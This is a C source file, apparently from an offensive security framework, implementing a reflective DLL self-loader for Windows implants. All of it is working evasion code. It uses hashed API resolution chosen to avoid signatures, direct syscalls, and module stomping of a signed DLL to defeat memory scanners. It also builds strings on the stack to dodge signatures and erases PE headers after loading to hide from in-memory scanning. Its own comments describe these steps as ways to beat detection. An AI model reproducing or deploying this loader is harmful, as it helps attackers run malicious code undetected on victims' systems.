/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * self_loader.c — Custom position-independent self-loader.
 *
 * This replaces ReflectiveLoader.c with a clean implementation.
 * Differences from the original:
 *
 *   1. DJB2 hash for PEB walking (vs signatured ROR13)
 *   2. Export named "_DllInit" (vs "ReflectiveLoader")
 *   3. Cleaner variable naming — harder to pattern match
 *   4. Same direct-syscall infrastructure for NtAllocateVirtualMemory,
 *      NtProtectVirtualMemory, NtFlushInstructionCache
 *   5. Per-section protections — never RWX
 *
 * This file is textually #include'd by dll.c, same as the original.
 */

#include "self_loader.h"
#include "syscall.c"

/* ------------------------------------------------------------------ */
/* Globals used by the including translation unit (dll.c)              */
/* ------------------------------------------------------------------ */

HINSTANCE hAppInstance = NULL;

/* ------------------------------------------------------------------ */
/* Position-independent base address finder                            */
/* ------------------------------------------------------------------ */

#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

__declspec(noinline) ULONG_PTR caller(VOID)
{
    return (ULONG_PTR)WIN_GET_CALLER();
}

/* ------------------------------------------------------------------ */
/* DJB2 hash helpers (PEB walking only — syscalls keep their own hash) */
/* ------------------------------------------------------------------ */

/* Hash Unicode module name bytes with uppercase normalization */
static inline __attribute__((always_inline)) DWORD djb2_mod(BYTE *buf, USHORT len)
{
    DWORD h = 5381;
    USHORT i;

    for (i = 0; i < len; i++)
    {
        BYTE c = buf[i];
        if (c >= 'a' && c <= 'z')
            c -= 0x20;
        h = ((h << 5) + h) + c;
    }

    return h;
}

/* Hash ASCII function name */
static inline __attribute__((always_inline)) DWORD djb2_fn(char *s)
{
    DWORD h = 5381;

    while (*s)
    {
        h = ((h << 5) + h) + (BYTE)*s;
        s++;
    }

    return h;
}

/* ------------------------------------------------------------------ */
/* Export control                                                       */
/* ------------------------------------------------------------------ */

#ifdef SELF_LOADER_NOEXPORT
#define SLEXPORT
#else
#define SLEXPORT DLLEXPORT
#endif

/* ------------------------------------------------------------------ */
/* The self-loader — position-independent DLL mapper                   */
/* ------------------------------------------------------------------ */

SLEXPORT ULONG_PTR WINAPI _DllInit(ULONG_PTR lpParam)
{
    LOADLIBRARYA   pLoadLibraryA   = NULL;
    GETPROCADDRESS pGetProcAddress = NULL;
    DISABLETHREADLIBRARYCALLS pDisableThreadLibraryCalls = NULL;
    PVOID          pNtdllBase      = NULL;

    /* Direct syscalls — own DJB2-hashed descriptors */
#ifdef ENABLE_STOPPAGING
    sc_entry_t *sc_list[4];
#else
    sc_entry_t *sc_list[3];
#endif

    sc_entry_t scAlloc   = { SC_ALLOCATEVIRTUALMEMORY_HASH, 6 };
    sc_entry_t scProtect = { SC_PROTECTVIRTUALMEMORY_HASH,  5 };
    sc_entry_t scFlush   = { SC_FLUSHINSTRUCTIONCACHE_HASH, 3 };
    sc_list[0] = &scAlloc;
    sc_list[1] = &scProtect;
    sc_list[2] = &scFlush;

#ifdef ENABLE_STOPPAGING
    sc_entry_t scLock = { SC_LOCKVIRTUALMEMORY_HASH, 4 };
    sc_list[3] = &scLock;
#endif

    ULONG_PTR imgBase;      /* base of our raw image in memory */
    ULONG_PTR mapBase;      /* base of our newly mapped image */
    ULONG_PTR pebAddr;
    ULONG_PTR ldrEntry;
    ULONG_PTR modBase;
    ULONG_PTR expDir;
    ULONG_PTR nameArr;
    ULONG_PTR ordArr;
    ULONG_PTR funcArr;
    ULONG_PTR ntHdr;
    DWORD     modHash;
    DWORD     fnHash;
    USHORT    remaining;
    USHORT    usLen;
    DWORD     dwProt;

    /* ---- STEP 0: Find our image base by scanning backwards ---- */

    imgBase = caller();

    while (1)
    {
        if (((PIMAGE_DOS_HEADER)imgBase)->e_magic == IMAGE_DOS_SIGNATURE)
        {
            ULONG_PTR lfanew = ((PIMAGE_DOS_HEADER)imgBase)->e_lfanew;

            if (lfanew >= sizeof(IMAGE_DOS_HEADER) && lfanew < 1024)
            {
                if (((PIMAGE_NT_HEADERS)(imgBase + lfanew))->Signature ==
                    IMAGE_NT_SIGNATURE)
                {
                    break;
                }
            }
        }

        imgBase--;
    }

    /* ---- STEP 1: Walk PEB to find kernel32 + ntdll ---- */

#ifdef _WIN64
    pebAddr = __readgsqword(0x60);
#else
    pebAddr = __readfsdword(0x30);
#endif

    pebAddr = (ULONG_PTR)((_PPEB)pebAddr)->pLdr;
    ldrEntry = (ULONG_PTR)((PPEB_LDR_DATA)pebAddr)->InMemoryOrderModuleList.Flink;

    while (ldrEntry)
    {
        BYTE  *nameBuf = (BYTE *)((PLDR_DATA_TABLE_ENTRY)ldrEntry)->BaseDllName.pBuffer;
        usLen = ((PLDR_DATA_TABLE_ENTRY)ldrEntry)->BaseDllName.Length;

        modHash = djb2_mod(nameBuf, usLen);

        if (modHash == MOD_KERNEL32)
        {
            /* Resolve LoadLibraryA and GetProcAddress from kernel32 */
            modBase = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)ldrEntry)->DllBase;

            expDir = modBase + ((PIMAGE_DOS_HEADER)modBase)->e_lfanew;
            nameArr = (ULONG_PTR)&((PIMAGE_NT_HEADERS)expDir)->OptionalHeader
                          .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            expDir = modBase + ((PIMAGE_DATA_DIRECTORY)nameArr)->VirtualAddress;

            nameArr = modBase + ((PIMAGE_EXPORT_DIRECTORY)expDir)->AddressOfNames;
            ordArr  = modBase + ((PIMAGE_EXPORT_DIRECTORY)expDir)->AddressOfNameOrdinals;

            remaining = 3;

            while (remaining > 0)
            {
                fnHash = djb2_fn((char *)(modBase + DEREF_32(nameArr)));

                if (fnHash == FN_LOADLIBRARYA || fnHash == FN_GETPROCADDRESS
                    || fnHash == FN_DISABLETHREADLIBRARYCALLS)
                {
                    funcArr = modBase + ((PIMAGE_EXPORT_DIRECTORY)expDir)->AddressOfFunctions;
                    funcArr += DEREF_16(ordArr) * sizeof(DWORD);

                    if (fnHash == FN_LOADLIBRARYA)
                        pLoadLibraryA = (LOADLIBRARYA)(modBase + DEREF_32(funcArr));
                    else if (fnHash == FN_GETPROCADDRESS)
                        pGetProcAddress = (GETPROCADDRESS)(modBase + DEREF_32(funcArr));
                    else
                        pDisableThreadLibraryCalls = (DISABLETHREADLIBRARYCALLS)(modBase + DEREF_32(funcArr));

                    remaining--;
                }

                nameArr += sizeof(DWORD);
                ordArr  += sizeof(WORD);
            }
        }
        else if (modHash == MOD_NTDLL)
        {
            pNtdllBase = ((PLDR_DATA_TABLE_ENTRY)ldrEntry)->DllBase;
        }

        if (pLoadLibraryA && pGetProcAddress)
            break;

        ldrEntry = DEREF(ldrEntry);
    }

    /* Resolve syscall numbers from ntdll */
    if (!sc_resolve(pNtdllBase, sc_list,
                    (sizeof(sc_list) / sizeof(sc_list[0]))))
    {
        return 0;
    }

    /* ---- STEP 2: Module stomping ----
     *
     * Instead of allocating fresh private (unbacked) memory for the
     * image, we load a sacrificial signed DLL and overwrite its pages.
     * The VAD/working-set metadata still shows the memory as backed by
     * the legitimate on-disk binary, which defeats VAD-walk scanners.
     *
     * The pages become copy-on-write (privately modified) once we
     * write to them, but the section object in the kernel still
     * references the signed file.
     *
     * Fallback: NtAllocateVirtualMemory if the stomp candidate is
     * too small or cannot be loaded. */

    ntHdr = imgBase + ((PIMAGE_DOS_HEADER)imgBase)->e_lfanew;

    SIZE_T regionSize = ((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader.SizeOfImage;
    mapBase = (ULONG_PTR)NULL;

    {
        /* Build the DLL name on the stack to avoid a string literal
         * in the .rdata section (PIC safety + signature avoidance). */
        char stomp[] = { 'd','b','g','h','e','l','p','.','d','l','l', 0 };
        HMODULE hStomp = pLoadLibraryA(stomp);

        if (hStomp != NULL)
        {
            ULONG_PTR stNtHdr = (ULONG_PTR)hStomp +
                                ((PIMAGE_DOS_HEADER)hStomp)->e_lfanew;
            SIZE_T stompSize =
                ((PIMAGE_NT_HEADERS)stNtHdr)->OptionalHeader.SizeOfImage;

            /* Suppress DLL_THREAD_ATTACH / DLL_THREAD_DETACH
             * for the sacrifice DLL before we overwrite its
             * code pages with the main image. */
            if (pDisableThreadLibraryCalls)
                pDisableThreadLibraryCalls(hStomp);

            if (stompSize >= regionSize)
            {
                PVOID protAddr = (PVOID)hStomp;
                SIZE_T protLen = regionSize;

                if (sc_NtProtectVirtualMemory(&scProtect, (HANDLE)-1,
                                              &protAddr, &protLen,
                                              PAGE_READWRITE,
                                              &dwProt) == 0)
                {
                    mapBase = (ULONG_PTR)hStomp;
                }
            }
        }
    }

    if (mapBase == (ULONG_PTR)NULL)
    {
        /* Fallback: private unbacked allocation */
        if (sc_NtAllocateVirtualMemory(&scAlloc, (HANDLE)-1,
                                       (PVOID *)&mapBase, 0,
                                       &regionSize,
                                       MEM_RESERVE | MEM_COMMIT,
                                       PAGE_READWRITE) != 0)
        {
            return 0;
        }
    }

#ifdef ENABLE_STOPPAGING
    sc_NtLockVirtualMemory(&scLock, (HANDLE)-1,
                           (PVOID *)&mapBase, &regionSize, 1);
#endif

    /* ---- STEP 3: Copy headers ---- */

    {
        ULONG_PTR hdrSize = ((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader.SizeOfHeaders;
        BYTE *src = (BYTE *)imgBase;
        BYTE *dst = (BYTE *)mapBase;

        while (hdrSize--)
            *dst++ = *src++;
    }

    /* ---- STEP 4: Copy sections ---- */

    {
        ULONG_PTR secPtr = (ULONG_PTR)&((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader +
                           ((PIMAGE_NT_HEADERS)ntHdr)->FileHeader.SizeOfOptionalHeader;
        WORD numSec = ((PIMAGE_NT_HEADERS)ntHdr)->FileHeader.NumberOfSections;

        while (numSec--)
        {
            BYTE *dst = (BYTE *)(mapBase + ((PIMAGE_SECTION_HEADER)secPtr)->VirtualAddress);
            BYTE *src = (BYTE *)(imgBase + ((PIMAGE_SECTION_HEADER)secPtr)->PointerToRawData);
            DWORD rawSz = ((PIMAGE_SECTION_HEADER)secPtr)->SizeOfRawData;

            while (rawSz--)
                *dst++ = *src++;

            secPtr += sizeof(IMAGE_SECTION_HEADER);
        }
    }

    /* ---- STEP 5: Process relocations ---- */

    {
        ULONG_PTR delta = mapBase -
            ((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader.ImageBase;

        ULONG_PTR relocDir = (ULONG_PTR)&((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader
                                 .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (((PIMAGE_DATA_DIRECTORY)relocDir)->Size)
        {
            ULONG_PTR totalSize = ((PIMAGE_BASE_RELOCATION)relocDir)->SizeOfBlock;
            ULONG_PTR block = mapBase +
                ((PIMAGE_DATA_DIRECTORY)relocDir)->VirtualAddress;

            while (totalSize && ((PIMAGE_BASE_RELOCATION)block)->SizeOfBlock)
            {
                ULONG_PTR page = mapBase +
                    ((PIMAGE_BASE_RELOCATION)block)->VirtualAddress;
                ULONG_PTR count = (((PIMAGE_BASE_RELOCATION)block)->SizeOfBlock -
                    sizeof(IMAGE_BASE_RELOCATION)) / sizeof(SELF_RELOC);
                ULONG_PTR entry = block + sizeof(IMAGE_BASE_RELOCATION);

                while (count--)
                {
                    if (((PSELF_RELOC)entry)->type == IMAGE_REL_BASED_DIR64)
                        *(ULONG_PTR *)(page + ((PSELF_RELOC)entry)->offset) += delta;
                    else if (((PSELF_RELOC)entry)->type == IMAGE_REL_BASED_HIGHLOW)
                        *(DWORD *)(page + ((PSELF_RELOC)entry)->offset) += (DWORD)delta;
                    else if (((PSELF_RELOC)entry)->type == IMAGE_REL_BASED_HIGH)
                        *(WORD *)(page + ((PSELF_RELOC)entry)->offset) += HIWORD(delta);
                    else if (((PSELF_RELOC)entry)->type == IMAGE_REL_BASED_LOW)
                        *(WORD *)(page + ((PSELF_RELOC)entry)->offset) += LOWORD(delta);

                    entry += sizeof(SELF_RELOC);
                }

                totalSize -= ((PIMAGE_BASE_RELOCATION)block)->SizeOfBlock;
                block += ((PIMAGE_BASE_RELOCATION)block)->SizeOfBlock;
            }
        }
    }

    /* ---- STEP 6: Resolve imports ---- */

    {
        ULONG_PTR impDir = (ULONG_PTR)&((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader
                               .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        ULONG_PTR impEntry = mapBase +
            ((PIMAGE_DATA_DIRECTORY)impDir)->VirtualAddress;

        while (((PIMAGE_IMPORT_DESCRIPTOR)impEntry)->Characteristics)
        {
            ULONG_PTR libAddr = (ULONG_PTR)pLoadLibraryA(
                (LPCSTR)(mapBase +
                    ((PIMAGE_IMPORT_DESCRIPTOR)impEntry)->Name));

            if (!libAddr)
            {
                impEntry += sizeof(IMAGE_IMPORT_DESCRIPTOR);
                continue;
            }

            ULONG_PTR oft = mapBase +
                ((PIMAGE_IMPORT_DESCRIPTOR)impEntry)->OriginalFirstThunk;
            ULONG_PTR iat = mapBase +
                ((PIMAGE_IMPORT_DESCRIPTOR)impEntry)->FirstThunk;

            while (DEREF(iat))
            {
                if (oft && ((PIMAGE_THUNK_DATA)oft)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                {
                    /* Import by ordinal */
                    ULONG_PTR libExpDir = libAddr +
                        ((PIMAGE_DOS_HEADER)libAddr)->e_lfanew;
                    ULONG_PTR libNameArr = (ULONG_PTR)&((PIMAGE_NT_HEADERS)libExpDir)
                        ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                    libExpDir = libAddr +
                        ((PIMAGE_DATA_DIRECTORY)libNameArr)->VirtualAddress;

                    ULONG_PTR addrArr = libAddr +
                        ((PIMAGE_EXPORT_DIRECTORY)libExpDir)->AddressOfFunctions;
                    addrArr += (IMAGE_ORDINAL(
                        ((PIMAGE_THUNK_DATA)oft)->u1.Ordinal) -
                        ((PIMAGE_EXPORT_DIRECTORY)libExpDir)->Base) * sizeof(DWORD);

                    DEREF(iat) = libAddr + DEREF_32(addrArr);
                }
                else
                {
                    /* Import by name */
                    ULONG_PTR ibn = mapBase + DEREF(iat);
                    DEREF(iat) = (ULONG_PTR)pGetProcAddress(
                        (HMODULE)libAddr,
                        (LPCSTR)((PIMAGE_IMPORT_BY_NAME)ibn)->Name);
                }

                iat += sizeof(ULONG_PTR);
                if (oft)
                    oft += sizeof(ULONG_PTR);
            }

            impEntry += sizeof(IMAGE_IMPORT_DESCRIPTOR);
        }
    }

    /* ---- STEP 7: Apply per-section protections (never RWX) ---- */

    {
        ULONG_PTR secPtr = (ULONG_PTR)&((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader +
                           ((PIMAGE_NT_HEADERS)ntHdr)->FileHeader.SizeOfOptionalHeader;
        WORD numSec = ((PIMAGE_NT_HEADERS)ntHdr)->FileHeader.NumberOfSections;

        while (numSec--)
        {
            DWORD ch = ((PIMAGE_SECTION_HEADER)secPtr)->Characteristics;
            ULONG_PTR secAddr = mapBase +
                ((PIMAGE_SECTION_HEADER)secPtr)->VirtualAddress;
            SIZE_T secSize = ((PIMAGE_SECTION_HEADER)secPtr)->SizeOfRawData;

            dwProt = 0;

            if (ch & IMAGE_SCN_MEM_WRITE)
                dwProt = PAGE_WRITECOPY;
            if (ch & IMAGE_SCN_MEM_READ)
                dwProt = PAGE_READONLY;
            if ((ch & IMAGE_SCN_MEM_WRITE) && (ch & IMAGE_SCN_MEM_READ))
                dwProt = PAGE_READWRITE;
            if (ch & IMAGE_SCN_MEM_EXECUTE)
                dwProt = PAGE_EXECUTE;
            if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE))
                dwProt = PAGE_EXECUTE_WRITECOPY;
            if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_READ))
                dwProt = PAGE_EXECUTE_READ;
            if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE) &&
                (ch & IMAGE_SCN_MEM_READ))
                dwProt = PAGE_EXECUTE_READWRITE;

            if (secSize)
            {
                sc_NtProtectVirtualMemory(&scProtect, (HANDLE)-1,
                                          (PVOID *)&secAddr, &secSize,
                                          dwProt, &dwProt);
            }

            secPtr += sizeof(IMAGE_SECTION_HEADER);
        }
    }

    /* ---- STEP 8: Flush and call entry point ---- */

    sc_NtFlushInstructionCache(&scFlush, (HANDLE)-1, NULL, 0);

    {
        ULONG_PTR ep = mapBase +
            ((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader.AddressOfEntryPoint;

        /* Save header size BEFORE DllMain (ntHdr points to the original
         * raw image which is still accessible). */
        DWORD hdrSize =
            ((PIMAGE_NT_HEADERS)ntHdr)->OptionalHeader.SizeOfHeaders;

        ((DLLMAIN)ep)((HINSTANCE)mapBase, DLL_PROCESS_ATTACH, (LPVOID)lpParam);

        /* ---- STEP 9: Stomp PE headers ----
         *
         * Zero the DOS header + PE signature + optional header at
         * mapBase so that in-memory scanners cannot find our PE by
         * searching for MZ / "PE\0\0" signatures.  The header page
         * is still PAGE_READWRITE (STEP 7 only touches sections). */
        {
            BYTE *p = (BYTE *)mapBase;
            DWORD i;

            for (i = 0; i < hdrSize; i++)
                p[i] = 0;
        }

        return ep;
    }
}

/* ------------------------------------------------------------------ */
/* Default DllMain (used if SELF_LOADER_CUSTOM_DLLMAIN is not defined */
/* by the including translation unit)                                  */
/* ------------------------------------------------------------------ */

#ifndef SELF_LOADER_CUSTOM_DLLMAIN

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;

    switch (dwReason)
    {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE *)lpReserved = hAppInstance;
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return bReturnValue;
}

#endif
